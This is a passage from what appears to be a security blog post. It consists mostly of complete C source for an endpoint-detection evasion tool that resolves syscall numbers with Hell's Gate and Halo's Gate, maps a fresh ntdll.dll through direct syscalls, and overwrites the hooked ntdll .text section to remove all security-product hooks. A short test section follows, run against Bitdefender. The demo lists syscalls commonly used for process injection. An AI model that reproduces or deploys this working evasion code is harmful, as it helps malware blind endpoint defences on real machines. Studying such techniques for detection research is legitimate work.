#ifndef FILE_SYNCHRONOUS_IO_NONALERT
#define FILE_SYNCHRONOUS_IO_NONALERT    0x00000020
#endif

// Required by NtOpenFile - reject if the path resolves to a directory
#ifndef FILE_NON_DIRECTORY_FILE
#define FILE_NON_DIRECTORY_FILE         0x00000040
#endif

// NtMapViewOfSection InheritDisposition: child processes do not inherit view
#define ViewUnmap                       2

// Guard against winternl.h re-defining this macro
#ifndef InitializeObjectAttributes
#define InitializeObjectAttributes(p, n, a, r, s) do { \
    (p)->Length                   = sizeof(OBJECT_ATTRIBUTES); \
    (p)->RootDirectory            = (r);                        \
    (p)->ObjectName               = (n);                        \
    (p)->Attributes               = (a);                        \
    (p)->SecurityDescriptor       = (s);                        \
    (p)->SecurityQualityOfService = NULL;                       \
} while (0)
#endif

// Inline UNICODE_STRING initializer - avoids calling ntdll's hooked
// RtlInitUnicodeString during setup
static inline void InitUStr(UNICODE_STRING *us, const WCHAR *s) {
    SIZE_T n = wcslen(s) * sizeof(WCHAR);
    us->Buffer        = (PWSTR)s;
    us->Length        = (USHORT)n;
    us->MaximumLength = (USHORT)(n + sizeof(WCHAR));
}

// S2  PEB / LDR structure definitions with known field layout
//
//     MinGW-w64 winternl.h stubs several fields out as Reserved[],
//     which breaks direct member access.  We define the full layout
//     ourselves so the offsets are guaranteed correct on x64 Windows.

typedef struct _MY_LDR_ENTRY {
    LIST_ENTRY     InLoadOrderLinks;
    LIST_ENTRY     InMemoryOrderLinks;    // <- we walk this list
    LIST_ENTRY     InInitializationOrderLinks;
    PVOID          DllBase;               // image base of the loaded DLL
    PVOID          EntryPoint;
    ULONG          SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
} MY_LDR_ENTRY, *PMY_LDR_ENTRY;

typedef struct _MY_PEB_LDR {
    ULONG      Length;
    BOOLEAN    Initialized;
    HANDLE     SsHandle;
    LIST_ENTRY InLoadOrderModuleList;
    LIST_ENTRY InMemoryOrderModuleList;   // <- entry point for our walk
} MY_PEB_LDR, *PMY_PEB_LDR;

// S3  Typed function pointer declarations for the four bootstrap NT calls

typedef NTSTATUS (NTAPI *PFN_NtOpenFile)(
    PHANDLE            FileHandle,
    ACCESS_MASK        DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PIO_STATUS_BLOCK   IoStatusBlock,
    ULONG              ShareAccess,
    ULONG              OpenOptions
);

typedef NTSTATUS (NTAPI *PFN_NtCreateSection)(
    PHANDLE            SectionHandle,
    ACCESS_MASK        DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,  // NULL = unnamed
    PLARGE_INTEGER     MaximumSize,       // NULL = whole file
    ULONG              SectionPageProtection,
    ULONG              AllocationAttributes,
    HANDLE             FileHandle
);

typedef NTSTATUS (NTAPI *PFN_NtMapViewOfSection)(
    HANDLE             SectionHandle,
    HANDLE             ProcessHandle,
    PVOID             *BaseAddress,
    ULONG_PTR          ZeroBits,
    SIZE_T             CommitSize,
    PLARGE_INTEGER     SectionOffset,     // NULL = start of section
    PSIZE_T            ViewSize,
    DWORD              InheritDisposition,
    ULONG              AllocationType,
    ULONG              Win32Protect
);

typedef NTSTATUS (NTAPI *PFN_NtClose)(HANDLE Handle);

typedef NTSTATUS (NTAPI *PFN_NtProtectVirtualMemory)(
    HANDLE   ProcessHandle,
    PVOID   *BaseAddress,
    PSIZE_T  RegionSize,
    ULONG    NewProtect,
    PULONG   OldProtect
);

// S4  Syscall stub pool
//
//     x86-64 Windows syscall stub template (11 bytes):
//
//       4C 8B D1           mov r10, rcx       <- Windows ABI: arg1 -> r10
//       B8 xx xx 00 00     mov eax, <SSN>     <- system service number
//       0F 05              syscall
//       C3                 ret
//
//     We allocate a single RWX page, stamp four copies of the template
//     into it, then patch the SSN DWORD (at byte offset 4) in each copy.
//     All four typed function pointers point into this page.

// Template bytes - SSN placeholder at bytes [4..7]
static const BYTE kStubTemplate[] = {
    0x4C, 0x8B, 0xD1,               // mov r10, rcx
    0xB8, 0x00, 0x00, 0x00, 0x00,   // mov eax, <SSN>
    0x0F, 0x05,                     // syscall
    0xC3                            // ret
};
#define STUB_SIZE       ((int)sizeof(kStubTemplate))
#define SSN_OFFSET      4           // byte offset of the DWORD SSN in the stub

// Indices into the stub pool for each function
#define SI_NtOpenFile                0
#define SI_NtCreateSection           1
#define SI_NtMapViewOfSection        2
#define SI_NtClose                   3
#define SI_NtProtectVirtualMemory    4
#define NUM_STUBS                    5

typedef struct {
    PVOID base;            // single RWX allocation backing all stubs
    PVOID slots[NUM_STUBS];
} StubPool;

// Allocate the pool and copy the template into each slot
static BOOL StubPool_Alloc(StubPool *sp) {
    sp->base = VirtualAlloc(NULL, STUB_SIZE * NUM_STUBS,
                            MEM_COMMIT | MEM_RESERVE,
                            PAGE_EXECUTE_READWRITE);
    if (!sp->base) return FALSE;

    for (int i = 0; i < NUM_STUBS; i++) {
        BYTE *slot = (BYTE *)sp->base + i * STUB_SIZE;
        memcpy(slot, kStubTemplate, STUB_SIZE);
        sp->slots[i] = slot;
    }
    return TRUE;
}

// Patch the SSN into slot idx after SSN resolution
static void StubPool_PatchSSN(StubPool *sp, int idx, DWORD ssn) {
    *(DWORD *)((BYTE *)sp->slots[idx] + SSN_OFFSET) = ssn;
}

static void StubPool_Free(StubPool *sp) {
    if (sp->base) { VirtualFree(sp->base, 0, MEM_RELEASE); sp->base = NULL; }
}

// S5  PEB walk - get ntdll base without any API call
//
//     x64 thread context layout:
//       GS:[0x60]     - PEB pointer
//       PEB + 0x18    - PEB.Ldr  (pointer to MY_PEB_LDR)
//
//     InMemoryOrderModuleList order (all Windows versions):
//       [0]  the host executable
//       [1]  ntdll.dll          <- what we want
//       [2]  kernel32 / kernelbase

static PVOID GetNtdllBase(void) {
    PVOID peb;
    // Read PEB pointer from GS segment without __readgsqword (avoids header deps)
    __asm__ volatile ("movq %%gs:0x60, %0" : "=r"(peb));

    // PEB+0x18 holds a PMY_PEB_LDR (pointer), so cast to PMY_PEB_LDR* and deref once
    PMY_PEB_LDR ldr = *(PMY_PEB_LDR *)((BYTE *)peb + 0x18);

    // Walk two Flinks: head -> exe -> ntdll
    LIST_ENTRY *head  = &ldr->InMemoryOrderModuleList;
    LIST_ENTRY *entry = head->Flink;  // module [0]: the host exe
    entry = entry->Flink;             // module [1]: ntdll.dll

    // Each LIST_ENTRY is the InMemoryOrderLinks field inside MY_LDR_ENTRY;
    // subtract the field offset to get the base of the struct
    PMY_LDR_ENTRY mod =
        (PMY_LDR_ENTRY)((BYTE *)entry - offsetof(MY_LDR_ENTRY, InMemoryOrderLinks));

    return mod->DllBase;
}

// S6  EAT walk - find an export by name in any mapped PE image

static PVOID EAT_FindExport(PVOID base, const char *name) {
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
    PIMAGE_NT_HEADERS nt  =
        (PIMAGE_NT_HEADERS)((BYTE *)base + dos->e_lfanew);

    DWORD eatRva =
        nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]
          .VirtualAddress;
    if (!eatRva) return NULL;

    PIMAGE_EXPORT_DIRECTORY eat =
        (PIMAGE_EXPORT_DIRECTORY)((BYTE *)base + eatRva);

    DWORD *nameRvas  = (DWORD *)((BYTE *)base + eat->AddressOfNames);
    WORD  *ordinals  = (WORD  *)((BYTE *)base + eat->AddressOfNameOrdinals);
    DWORD *funcRvas  = (DWORD *)((BYTE *)base + eat->AddressOfFunctions);

    for (DWORD i = 0; i < eat->NumberOfNames; i++) {
        if (strcmp((char *)((BYTE *)base + nameRvas[i]), name) == 0)
            return (BYTE *)base + funcRvas[ordinals[i]];
    }
    return NULL;
}

// S7  Hell's Gate + Halo's Gate SSN resolution
//
//     Hell's Gate: an unhooked Nt* stub begins with:
//         4C 8B D1  B8 xx xx 00 00   (mov r10,rcx ; mov eax,SSN)
//     The SSN is the DWORD at byte offset 4 of the stub.
//
//     Halo's Gate: if the stub prologue has been overwritten by an EDR hook
//     (e.g. E9 xx JMP trampoline), scan neighboring Nt* stubs N32 bytes.
//     ntdll's syscall stubs are laid out contiguously and their SSNs increment
//     by exactly 1, so:  target_SSN = neighbor_SSN  N
//
//     The 32-byte stride is the actual stub size on current Windows builds
//     (W10/W11).  It has been stable for years but is technically a heuristic.

// Read SSN from `p` if it looks like an unhooked stub, else return -1
static int TryReadSSN(const BYTE *p) {
    if (p[0] == 0x4C && p[1] == 0x8B && p[2] == 0xD1 && p[3] == 0xB8)
        return (int)(*(const DWORD *)(p + 4));
    return -1;
}

static int ResolveSSN(PVOID ntdllBase, const char *funcName) {
    const BYTE *target = (const BYTE *)EAT_FindExport(ntdllBase, funcName);
    if (!target) {
        fprintf(stderr, "[!] Export not found: %s\n", funcName);
        return -1;
    }

    // Fast path: stub is unhooked
    int ssn = TryReadSSN(target);
    if (ssn >= 0) return ssn;

    fprintf(stderr, "[~] %s appears hooked - invoking Halo's Gate\n", funcName);

    // Slow path: scan 32 neighbors (32 bytes per stub = typical ntdll stride)
    for (int d = 1; d <= 32; d++) {
        // Forward neighbor: its SSN = target_SSN + d, so target = fwdSSN - d
        int fwd = TryReadSSN(target + d * 32);
        if (fwd >= 0 && fwd >= d) {
            fprintf(stderr, "[~] Resolved %s via +%d neighbor\n", funcName, d);
            return fwd - d;
        }

        // Backward neighbor: its SSN = target_SSN - d, so target = bwdSSN + d
        int bwd = TryReadSSN(target - d * 32);
        if (bwd >= 0) {
            fprintf(stderr, "[~] Resolved %s via -%d neighbor\n", funcName, d);
            return bwd + d;
        }
    }

    fprintf(stderr, "[!] Halo's Gate exhausted for %s\n", funcName);
    return -1;
}

// S8  LoadCleanNtdll - the main routine
//
//     Maps a fresh, unhooked copy of ntdll.dll into the calling process
//     using only direct syscalls.  On success, *cleanBaseOut is a valid
//     PE base address that can be used for EAT lookups and direct calls.

// We expose the NtProtectVirtualMemory stub so UnhookNtdll can use it
// after LoadCleanNtdll returns (stub pool would otherwise be freed).
// Caller must VirtualFree this when done.
static PVOID g_pNtProtect = NULL;

BOOL LoadCleanNtdll(PVOID *cleanBaseOut) {
    StubPool sp = { 0 };

    // Allocate the RWX stub page
    if (!StubPool_Alloc(&sp)) {
        fprintf(stderr, "[!] VirtualAlloc (stub pool) failed: %lu\n",
                GetLastError());
        return FALSE;
    }

    // Locate the in-process ntdll and resolve the four bootstrap SSNs
    PVOID ntdllBase = GetNtdllBase();
    fprintf(stderr, "[+] In-process ntdll base:  %p\n", ntdllBase);

    static const struct { int idx; const char *name; } kFuncs[NUM_STUBS] = {
        { SI_NtOpenFile,              "NtOpenFile"              },
        { SI_NtCreateSection,         "NtCreateSection"         },
        { SI_NtMapViewOfSection,      "NtMapViewOfSection"      },
        { SI_NtClose,                 "NtClose"                 },
        { SI_NtProtectVirtualMemory,  "NtProtectVirtualMemory"  },
    };

    for (int i = 0; i < NUM_STUBS; i++) {
        int ssn = ResolveSSN(ntdllBase, kFuncs[i].name);
        if (ssn < 0) { StubPool_Free(&sp); return FALSE; }
        fprintf(stderr, "[+] %-24s SSN = 0x%04X\n", kFuncs[i].name, ssn);
        StubPool_PatchSSN(&sp, kFuncs[i].idx, (DWORD)ssn);
    }

    // Cast stub slots to typed function pointers.
    // From this point on, no function in the original hooked ntdll is touched.
    PFN_NtOpenFile         pNtOpenFile  = (PFN_NtOpenFile)        sp.slots[SI_NtOpenFile];
    PFN_NtCreateSection    pNtCrtSect   = (PFN_NtCreateSection)   sp.slots[SI_NtCreateSection];
    PFN_NtMapViewOfSection pNtMapView   = (PFN_NtMapViewOfSection)sp.slots[SI_NtMapViewOfSection];
    PFN_NtClose            pNtClose     = (PFN_NtClose)           sp.slots[SI_NtClose];

    NTSTATUS st;
    HANDLE   hFile    = NULL;
    HANDLE   hSection = NULL;
    PVOID    baseAddr = NULL;
    SIZE_T   viewSize = 0;

    // Step 1: Open ntdll.dll on disk
    // NtOpenFile requires the NT object namespace path (\\\...), not Win32
    UNICODE_STRING ntdllPath;
    InitUStr(&ntdllPath, L"\\??\\C:\\Windows\\System32\\ntdll.dll");

    OBJECT_ATTRIBUTES objAttr = { 0 };
    InitializeObjectAttributes(&objAttr, &ntdllPath, OBJ_CASE_INSENSITIVE, NULL, NULL);

    IO_STATUS_BLOCK iosb = { 0 };

    st = pNtOpenFile(
        &hFile,
        FILE_READ_DATA | SYNCHRONIZE,           // EXECUTE not needed to back a section
        &objAttr,
        &iosb,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE
    );
    if (!NT_SUCCESS(st)) {
        fprintf(stderr, "[!] NtOpenFile failed: 0x%08lX\n", st);
        StubPool_Free(&sp);
        return FALSE;
    }
    fprintf(stderr, "[+] NtOpenFile OK  hFile=%p\n", hFile);

    // Step 2: Create a SEC_IMAGE section backed by the file
    // SEC_IMAGE instructs the kernel to apply full PE layout (section alignment,
    // base relocations, etc.) so the mapping matches a real loaded DLL exactly.
    st = pNtCrtSect(
        &hSection,
        SECTION_MAP_READ | SECTION_MAP_EXECUTE,
        NULL,           // unnamed section: no OBJECT_ATTRIBUTES required
        NULL,           // maximum size = file size (NULL means whole file)
        PAGE_READONLY,
        SEC_IMAGE,
        hFile
    );
    pNtClose(hFile);    // file handle no longer needed after the section is created
    if (!NT_SUCCESS(st)) {
        fprintf(stderr, "[!] NtCreateSection failed: 0x%08lX\n", st);
        StubPool_Free(&sp);
        return FALSE;
    }
    fprintf(stderr, "[+] NtCreateSection OK  hSection=%p\n", hSection);

    // Step 3: Map the section into our process
    // PAGE_EXECUTE_WRITECOPY is required for SEC_IMAGE sections;
    // PAGE_EXECUTE_READ returns STATUS_SECTION_PROTECTION on modern Windows.
    // The kernel fills baseAddr with the chosen virtual address automatically.
    st = pNtMapView(
        hSection,
        GetCurrentProcess(),
        &baseAddr,
        0,              // ZeroBits: no VA placement constraint
        0,              // CommitSize: auto for SEC_IMAGE
        NULL,           // SectionOffset: map from byte 0 of the section
        &viewSize,
        ViewUnmap,      // child processes do NOT inherit this view
        0,              // AllocationType: default
        PAGE_EXECUTE_WRITECOPY
    );
    pNtClose(hSection);
    if (!NT_SUCCESS(st)) {
        fprintf(stderr, "[!] NtMapViewOfSection failed: 0x%08lX\n", st);
        StubPool_Free(&sp);
        return FALSE;
    }
    fprintf(stderr, "[+] Clean ntdll mapped  base=%p  size=%.1f KB\n",
            baseAddr, viewSize / 1024.0);

    // Keep the NtProtect stub alive in its own allocation so UnhookNtdll
    // can use it after this function returns; free the rest of the pool.
    g_pNtProtect = VirtualAlloc(NULL, STUB_SIZE,
                                MEM_COMMIT | MEM_RESERVE,
                                PAGE_EXECUTE_READWRITE);
    if (g_pNtProtect)
        memcpy(g_pNtProtect, sp.slots[SI_NtProtectVirtualMemory], STUB_SIZE);

    StubPool_Free(&sp);
    *cleanBaseOut = baseAddr;
    return TRUE;
}

// S9  Post-load helpers
//
//     The clean mapping's EAT stubs have never been touched by any EDR,
//     so TryReadSSN() always succeeds - no Halo's Gate fallback needed.

// Extract any SSN directly from the unhooked EAT - zero guessing
int GetSSNFromClean(PVOID cleanBase, const char *funcName) {
    const BYTE *va = (const BYTE *)EAT_FindExport(cleanBase, funcName);
    if (!va) { fprintf(stderr, "[!] %s not in clean EAT\n", funcName); return -1; }
    int ssn = TryReadSSN(va);
    if (ssn < 0) fprintf(stderr, "[!] Unexpected stub bytes for %s\n", funcName);
    return ssn;
}

// Return a direct function pointer into the clean ntdll.
// Calling through this pointer bypasses any hook on the original ntdll stub.
void *GetFnFromClean(PVOID cleanBase, const char *funcName) {
    return EAT_FindExport(cleanBase, funcName);
}

// S10 UnhookNtdll
//
//     Copies the .text section from the clean mapped ntdll over the hooked
//     .text in the original in-process ntdll.  This removes every EDR hook
//     (JMP trampolines, INT3 patches, etc.) from the live DLL in one shot.
//
//     Steps:
//       1. Find the .text section header in the clean PE (use VirtualAddress
//          since both images are memory-mapped, not file-on-disk offsets).
//       2. Make the destination region writable via NtProtectVirtualMemory
//          (using our direct syscall stub - no hooked VirtualProtect call).
//       3. memcpy clean bytes -> hooked bytes.
//       4. Restore original protection.

static BOOL UnhookNtdll(PVOID cleanBase, PVOID hookedBase) {
    if (!g_pNtProtect) {
        fprintf(stderr, "[!] NtProtect stub not available\n");
        return FALSE;
    }
    PFN_NtProtectVirtualMemory pNtProtect =
        (PFN_NtProtectVirtualMemory)g_pNtProtect;

    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)cleanBase;
    PIMAGE_NT_HEADERS nt  =
        (PIMAGE_NT_HEADERS)((BYTE *)cleanBase + dos->e_lfanew);
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);

    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {
        if (memcmp(sec->Name, ".text", 5) != 0) continue;

        // Both images are SEC_IMAGE mapped, so use VirtualAddress (not PointerToRawData)
        PVOID  cleanText  = (BYTE *)cleanBase  + sec->VirtualAddress;
        PVOID  hookedText = (BYTE *)hookedBase + sec->VirtualAddress;
        SIZE_T textSize   = sec->Misc.VirtualSize;

        printf("[*] .text  RVA=0x%08lX  size=0x%lX\n",
               sec->VirtualAddress, sec->Misc.VirtualSize);
        printf("[*] clean  src  = %p\n", cleanText);
        printf("[*] hooked dest = %p\n", hookedText);

        // Make the hooked ntdll .text writable (bypasses VirtualProtect hook)
        DWORD  oldProt = 0;
        PVOID  protBase = hookedText;
        SIZE_T protSize = textSize;
        NTSTATUS st = pNtProtect(GetCurrentProcess(),
                                  &protBase, &protSize,
                                  PAGE_EXECUTE_READWRITE, &oldProt);
        if (!NT_SUCCESS(st)) {
            fprintf(stderr, "[!] NtProtect (RW) failed: 0x%08lX\n", st);
            return FALSE;
        }

        // Overwrite every hooked byte with the clean version
        memcpy(hookedText, cleanText, textSize);

        // Restore original protection
        protBase = hookedText;
        protSize = textSize;
        pNtProtect(GetCurrentProcess(),
                   &protBase, &protSize,
                   oldProt, &oldProt);

        printf("[+] .text patched - all hooks removed\n");
        return TRUE;
    }

    fprintf(stderr, "[!] .text section not found in clean PE\n");
    return FALSE;
}

// S11 Demo main

int main(void) {
    printf("=== Load Clean NTDLL + Unhook via Direct Syscall Bootstrap ===\n\n");

    PVOID cleanBase = NULL;
    if (!LoadCleanNtdll(&cleanBase)) {
        fprintf(stderr, "[-] LoadCleanNtdll failed.\n");
        return 1;
    }
    printf("\n[+] Clean ntdll at %p\n\n", cleanBase);


    // Because the clean copy has never been touched, TryReadSSN() works on
    // every stub - no neighbor scan fallback required.
    static const char *kTargets[] = {
        "NtAllocateVirtualMemory",
        "NtWriteVirtualMemory",
        "NtProtectVirtualMemory",
        "NtReadVirtualMemory",
        "NtCreateThreadEx",
        "NtQueueApcThread",
        "NtResumeThread",
        "NtSuspendThread",
        "NtCreateSection",
        "NtMapViewOfSection",
        "NtUnmapViewOfSection",
        "NtOpenProcess",
        NULL
    };

    printf("[*] SSNs extracted from clean EAT:\n");
    for (int i = 0; kTargets[i]; i++) {
        int ssn = GetSSNFromClean(cleanBase, kTargets[i]);
        if (ssn >= 0)
            printf("    %-34s  0x%04X  (%d)\n", kTargets[i], ssn, ssn);
    }


    // NtClose(NULL) always returns STATUS_INVALID_HANDLE (0xC0000008).
    // By routing through the clean stub we prove execution never touches
    // an EDR trampoline.
    printf("\n[*] Calling NtClose(NULL) via clean ntdll stub...\n");
    PFN_NtClose cleanClose = (PFN_NtClose)GetFnFromClean(cleanBase, "NtClose");
    if (cleanClose) {
        NTSTATUS s = cleanClose(NULL);
        printf("[+] NtClose(NULL) returned 0x%08lX  "
               "(expect 0xC0000008 = STATUS_INVALID_HANDLE)\n", s);
    }


    // This removes every Bitdefender/EDR trampoline from the live ntdll.
    // After this call, ntdll!NtOpenFile (and every other hooked stub) will
    // show the original syscall prologue again in WinDbg.
    PVOID hookedBase = GetNtdllBase();
    printf("\n[*] Unhooked ntdll base (live): %p\n", hookedBase);
    printf("[*] Overwriting hooked .text with clean bytes...\n");

    if (!UnhookNtdll(cleanBase, hookedBase)) {
        fprintf(stderr, "[-] UnhookNtdll failed.\n");
        return 1;
    }

    printf("\n[*] PID = %lu  -- sleeping 60s, attach WinDbg now\n", GetCurrentProcessId());
    printf("[*] windbg -p %lu\n", GetCurrentProcessId());
    printf("[*] then run: u ntdll!NtOpenFile\n");
    printf("[*]           u ntdll!NtCreateSection\n");
    printf("[*]           u ntdll!NtAllocateVirtualMemory\n");
    printf("[*] expected:  mov r10,rcx / mov eax,<SSN> / syscall / ret\n");

    Sleep(60000);

    if (g_pNtProtect) VirtualFree(g_pNtProtect, 0, MEM_RELEASE);
    return 0;
}
```
# Test Time

I am using Bitdefender in my endpoint. We run the hook test and got many hooks. Original hooks (check of any process, we can see `jmp`):

![](/img/reclaim-1.png)

As you can see the jmp address it's a trampoline to Bitdefender DLL. We get this when starting any process in loading modules:

![](/img/reclaim-2.png)

Now testing hooks all with above code:

![](/img/reclaim-3.png)

Test the first patching approach, (Compile all using `x86_64-w64-mingw32-gcc -Wall -Wextra -O0 -g -o approach.exe approach.c`):

![](/img/2026-05-26_23-01.png)

Testing second approach:

![](/img/2026-05-26_23-15.png)

Testing third approach:

![](/img/2026-05-27_00-39.png)

We get:

```c
0:001> u ntdll!NtOpenFile
ntdll!NtOpenFile:
00007ffb`7974d660 4c8bd1          mov     r10,rcx
00007ffb`7974d663 b833000000      mov     eax,33h
00007ffb`7974d668 f604250803fe7f01 test    byte ptr [SharedUserData+0x308 (00000000`7ffe0308)],1
00007ffb`7974d670 7503            jne     ntdll!NtOpenFile+0x15 (00007ffb`7974d675)
00007ffb`7974d672 0f05            syscall
00007ffb`7974d674 c3              ret
00007ffb`7974d675 cd2e            int     2Eh
00007ffb`7974d677 c3              ret
```

without any `jmp` instruction which means all approaches worked. The `test` and `jne` we see in the stub are a compatibility check Microsoft added in Windows 10. The kernel maps a shared read only page called `KUSER_SHARED_DATA` at `0x7FFE0000` in every process, and at offset `0x308` sits a field called `SystemCall`. If that bit is 0, the stub takes the syscall path. If it is 1, it falls through to `int 2Eh`, the legacy way of issuing a syscall inherited from 32-bit Windows.

On any x64 machine running Windows 10 or 11 natively, `SystemCall` is always 0, so `jne` is never taken and `int 2Eh` is dead code that never executes. Microsoft left it there for WoW64 edge cases and certain hypervisor environments where syscall might be intercepted. For all practical purposes on real hardware you can ignore it entirely, which is exactly why our direct syscall stub skips the check and jumps straight to syscall with no side effects.

- Approach 1 = patches stubs one by one, needs neighbor guessing for hooked ones
- Approach 2 = one big memcpy but reads raw file bytes, needs `PointerToRawData`
- Approach 3 = kernel maps the clean copy properly as a PE image, SSNs readable directly with zero guessing, then optionally remaps the hooked ntdll from it

---